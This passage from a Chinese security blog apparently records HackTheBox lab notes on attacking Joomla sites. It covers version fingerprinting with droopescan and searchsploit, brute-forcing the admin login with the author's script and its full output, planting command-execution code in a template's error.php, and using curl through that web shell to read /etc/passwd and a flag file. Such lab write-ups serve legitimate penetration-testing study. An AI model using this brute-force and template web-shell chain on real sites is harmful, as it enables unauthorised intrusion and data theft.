  <span class="token operator">&lt;</span>version<span class="token operator">></span><span class="token number">3.9</span>.<span class="token operator"><span class="token file-descriptor important">4</span>&lt;</span>/version<span class="token operator">></span>
  <span class="token operator">&lt;</span>creationDate<span class="token operator">></span>March <span class="token number">201</span><span class="token operator"><span class="token file-descriptor important">9</span>&lt;</span>/creationDate<span class="token operator">></span>
  
 <span class="token operator">&lt;</span>SNIP<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> &#x3D;&#x3D;plugins&#x2F;system&#x2F;cache&#x2F;cache.xml&#x3D;&#x3D;这个文件中也可以看到大致的版本信息</p>
<h3 id="脚本枚举"><a href="#脚本枚举" class="headerlink" title="脚本枚举"></a>脚本枚举</h3><p><a target="_blank" rel="noopener" href="https://github.com/droope/droopescan">droopescan</a>是一个基于插件的扫描器，适用于 SilverStripe、 WordPress 和 Drupal，但在 Joomla 和 Moodle 的功能有限。</p>
<p>用<code>pip install droopescan</code>就能安装。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ droopescan scan joomla <span class="token parameter variable">--url</span> http://dev.inlanefreight.local/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>另一个是<a target="_blank" rel="noopener" href="https://github.com/OWASP/joomscan">joomscan</a>，但这玩意儿有点过时了，需要用py2.7才能跑</p>
<h2 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h2><p>Joomla默认的账号是admin，对于他的密码爆破有<a target="_blank" rel="noopener" href="https://github.com/ajnik/joomla-bruteforce">joomla-brute.py</a>可以使用。感觉还是requests比较快，优化了一下参数提取啥的，这是我的<a target="_blank" rel="noopener" href="https://github.com/Ark4izZ/scripts/blob/main/JoomlaBuster/JomlaBuster.py">脚本</a></p>
<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><pre class="line-numbers language-none"><code class="language-none">WWW  WEB部署目录（或者子目录）,一般称为网站的根目录
├─administrator           后台管理目录，在这个目录中包含了后台管理的所有文件。后台本身也是一个Joomla网站
│  ├─cache      
│  ├─components    
│  ├─help
│  ├─includes
│  ├─language
│  ├─logs
│  ├─ manifests
│  ├─ media
│  ├─ modules
│  ├─ templates
│  │
│  └─index.php        后台入口点文件
├─bin                     缓存文件目录
├─cache                   缓存文件目录
├─cli                     PHP CLI模式下的范例代码
├─components              组件文件目录
├─images                  图片文件目录
├─includes                核心代码文件目录
├─installation            程序的安装目录，安装成功后，此目录将被删除
├─layout                  布局文件目录
├─language                语言文件目录
├─libraries               库文件目录
├─logs                    日志文件目录。默认情况下这个目录不存在
├─media                   媒体资源文件
├─modules                 模块文件目录
├─plugins                 插件文件目录
├─templates               模板文件目录
├─tmp                     临时文件目录
│  
├─configuration.php       系统配置文件
├─htaccess.txt            Apache下的.htaccess文件
├─index.php            入口点文件
├─LICENSE.txt             授权说明文件
├─README.txt              README 文件
├─robots.txt              robots文件
├─robots.txt.dist         
├─web.config.txt          Negix下的web.config文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Attacking"><a href="#Attacking" class="headerlink" title="Attacking"></a>Attacking</h2><h3 id="弱口令爆破-后台getshell"><a href="#弱口令爆破-后台getshell" class="headerlink" title="弱口令爆破+后台getshell"></a>弱口令爆破+后台getshell</h3><p><a target="_blank" rel="noopener" href="https://github.com/Ark4izZ/scripts/blob/main/JoomlaBuster/JomlaBuster.py">脚本地址</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Desktop/htb<span class="token punctuation">]</span>
└─<span class="token comment"># python3 JoomlaBuster.py -u http://app.inlanefreight.local -v -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin </span>
testing admin <span class="token builtin class-name">:</span> admin
 admin:admin
testing admin <span class="token builtin class-name">:</span> password
 admin:password
testing admin <span class="token builtin class-name">:</span> manager
 admin:manager
testing admin <span class="token builtin class-name">:</span> letmein
 admin:letmein
testing admin <span class="token builtin class-name">:</span> cisco
 admin:cisco
testing admin <span class="token builtin class-name">:</span> default
 admin:default
testing admin <span class="token builtin class-name">:</span> root
 admin:root
testing admin <span class="token builtin class-name">:</span> apc
 admin:apc
testing admin <span class="token builtin class-name">:</span> pass
 admin:pass
testing admin <span class="token builtin class-name">:</span> security
 admin:security
testing admin <span class="token builtin class-name">:</span> user
 admin:user
testing admin <span class="token builtin class-name">:</span> system
 admin:system
testing admin <span class="token builtin class-name">:</span> sys
 admin:sys
testing admin <span class="token builtin class-name">:</span> none
 admin:none
testing admin <span class="token builtin class-name">:</span> xampp
 admin:xampp
testing admin <span class="token builtin class-name">:</span> wampp
 admin:wampp
testing admin <span class="token builtin class-name">:</span> ppmax2011
 admin:ppmax2011
testing admin <span class="token builtin class-name">:</span> turnkey
 success<span class="token operator">!</span><span class="token operator">!</span> admin:turnkey<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用<code>admin:turnkey</code>登录后台</p>
<img src="/2023/04/19/hack-wordpress-and-Joomla/image-20230424203846542.png" class title="image-20230424203846542">

<p>在template中找到主题编辑选项，这里可以编辑php代码，在error.php中加入执行代码。</p>
<img src="/2023/04/19/hack-wordpress-and-Joomla/image-20230424204308137.png" class title="image-20230424204308137">

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Desktop/htb<span class="token punctuation">]</span>
└─<span class="token comment"># curl -s http://app.inlanefreight.local/templates/beez3/error.php?ak4izz=id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Desktop/htb<span class="token punctuation">]</span>
└─<span class="token comment"># droopescan scan joomla -u http://dev.inlanefreight.local</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Possible version<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:                                                        
    <span class="token number">3.8</span>.10
    <span class="token number">3.8</span>.11
    <span class="token number">3.8</span>.11-rc
    <span class="token number">3.8</span>.12
    <span class="token number">3.8</span>.12-rc
    <span class="token number">3.8</span>.13
    <span class="token number">3.8</span>.7
    <span class="token number">3.8</span>.7-rc
    <span class="token number">3.8</span>.8
    <span class="token number">3.8</span>.8-rc
    <span class="token number">3.8</span>.9
    <span class="token number">3.8</span>.9-rc

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Possible interesting urls found:
    Detailed version information. - http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml
    Login page. - http://dev.inlanefreight.local/administrator/
    License file. - http://dev.inlanefreight.local/LICENSE.txt
    Version attribute contains approx version - http://dev.inlanefreight.local/plugins/system/cache/cache.xml

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Scan finished <span class="token punctuation">(</span><span class="token number">0</span>:00:14.386738 elapsed<span class="token punctuation">)</span>
                                                                                                                                        
┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Desktop/htb<span class="token punctuation">]</span>
└─<span class="token comment"># curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | grep version</span>
<span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"1.0"</span> <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"UTF-8"</span>?<span class="token operator">></span>
<span class="token operator">&lt;</span>extension <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"3.6"</span> <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"file"</span> <span class="token assign-left variable">method</span><span class="token operator">=</span><span class="token string">"upgrade"</span><span class="token operator">></span>
        <span class="token operator">&lt;</span>license<span class="token operator">></span>GNU General Public License version <span class="token number">2</span> or later<span class="token punctuation">;</span> see LICENSE.txt<span class="token operator">&lt;</span>/license<span class="token operator">></span>
        <span class="token operator">&lt;</span>version<span class="token operator">></span><span class="token number">3.9</span>.<span class="token operator"><span class="token file-descriptor important">4</span>&lt;</span>/version<span class="token operator">></span>
                                                                                                                                        
┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Desktop/htb<span class="token punctuation">]</span>
└─<span class="token comment"># searchsploit joomla 3.9.4     </span>
Joomla<span class="token operator">!</span> Core <span class="token number">1.5</span>.0 - <span class="token number">3.9</span>.4 - Directory Traversal / Authenticated Arbitrary File Deletion              <span class="token operator">|</span> php/webapps/46710.py

<span class="token comment"># 顺便爆破出弱口令</span>

┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Desktop/htb<span class="token punctuation">]</span>
└─<span class="token comment"># python3 JoomlaBuster.py -u http://dev.inlanefreight.local -v -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin         </span>
testing admin <span class="token builtin class-name">:</span> admin
 success<span class="token operator">!</span><span class="token operator">!</span> admin:admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现有对应版本目录穿越的exp。</p>
<p>这里直接用rce打了，目录穿越的脚本有问题。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Desktop/htb<span class="token punctuation">]</span>
└─<span class="token comment"># curl -s http://dev.inlanefreight.local/templates/beez3/error.php?cmd=cat%20../../../../../etc/passwd</span>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Desktop/htb<span class="token punctuation">]</span>
└─<span class="token comment"># curl -s http://dev.inlanefreight.local/templates/beez3/error.php?cmd=cat%20/var/www/dev.inlanefreight.local/flag*</span>
j00mla_c0re_d1rtrav3rsal<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>




	  <div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2023/04/20/CRLF攻击原理/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2023/04/16/关于shell的一些东西/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2023-04-19 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Web/">Web<span>2</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/hackthebox/">hackthebox<span>1</span></a></li> <li><a href="/tags/wordpress/">wordpress<span>1</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#WordPress"><span class="toc-article-text">WordPress</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-article-text">前置</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%85%B3%E9%94%AE%E6%96%87%E4%BB%B6-x2F-%E7%9B%AE%E5%BD%95"><span class="toc-article-text">关键文件&#x2F;目录</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#WP%E7%94%A8%E6%88%B7%E8%A7%92%E8%89%B2"><span class="toc-article-text">WP用户角色</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-article-text">信息搜集</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%89%88%E6%9C%AC"><span class="toc-article-text">版本</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%B8%BB%E9%A2%98%E5%92%8C%E6%8F%92%E4%BB%B6"><span class="toc-article-text">主题和插件</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%89%8B%E6%B5%8B"><span class="toc-article-text">手测</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B7%A5%E5%85%B7%EF%BC%9Awpscan"><span class="toc-article-text">工具：wpscan</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-article-text">漏洞利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-article-text">爆破</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-article-text">代码执行</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#msf"><span class="toc-article-text">msf</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Joomla"><span class="toc-article-text">Joomla</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%8C%87%E7%BA%B9%E6%90%9C%E9%9B%86"><span class="toc-article-text">指纹搜集</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%89%8B%E6%B5%8B-1"><span class="toc-article-text">手测</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%84%9A%E6%9C%AC%E6%9E%9A%E4%B8%BE"><span class="toc-article-text">脚本枚举</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%85%B6%E4%BB%96%E4%BF%A1%E6%81%AF"><span class="toc-article-text">其他信息</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-article-text">目录结构</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Attacking"><span class="toc-article-text">Attacking</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4-%E5%90%8E%E5%8F%B0getshell"><span class="toc-article-text">弱口令爆破+后台getshell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-article-text">目录穿越</span></a></li></ol></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2023 Ak4izZ's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



</body>
   </html>
